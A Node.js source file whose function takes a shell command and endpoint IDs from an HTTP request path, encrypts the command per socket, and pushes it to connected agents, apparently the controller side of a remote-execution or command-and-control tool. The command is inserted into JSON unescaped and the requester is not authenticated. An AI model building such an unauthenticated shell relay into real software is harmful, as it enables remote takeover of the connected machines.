function httpRes(socket, sockets, getdata, privateKey){
	//parsing command and enpoints
	const ciph = require('./crypto/crypto');
	var parsing = getdata[1].split("_._/")
	var cmdp = parsing[0].split("/command=")[1].split("%20")
	var endp = parsing[1].split("endp=")[1].split(",")
	var command = "";
	cmdp.forEach(str => {
		command += str + " ";
	});
	command = String(command)
	endp.forEach( endpo =>{
		sockets.forEach( async sock =>{
			if (endpo === sock["id"].replace(/['"]+/g, '')){
				//sock.write(ciph.decrypt(`{"order": "shell", "command": "${command}"}`, privateKey))
				theQuery = `{"order": "shell", "command": "${command}"}`
				console.log("Query que va a ser encriptada: ", theQuery)
				let encrypted = await ciph.symEncrpyt(sock["sym"], theQuery)
				console.log(encrypted)
				await sock.write(encrypted)
			};
		});
	});
	console.log(`comando a ejecutar: ${command} en los endpoints ${String(endp)}`);			
	socket.write([
		'HTTP/1.1 200 OK',
	    'Content-Type: text/html; charset=UTF-8',
	    'Content-Encoding: UTF-8',
	    'Accept-Ranges: bytes',
	    'Connection: keep-alive',
		].join('\n') + '\n\n');
	socket.write("'Connection': 'close'");
	socket.end(); // HTTP 1.0 signals end of packet by closing the socket
}



exports.httpRes = httpRes;